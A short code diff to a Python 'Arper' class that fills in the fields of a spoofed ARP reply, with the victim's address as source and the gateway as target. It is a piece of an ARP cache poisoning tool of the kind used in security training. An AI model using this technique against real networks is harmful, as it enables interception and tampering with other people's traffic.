@@ -48,7 +48,9 @@ class Arper():
         print('_'*30)
         poison_gateway = ARP()
         poison_gateway.op = 2
-        
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst  = self.gateway
+        poison_gateway.hwdst = self.gatewaymac
 
 
 
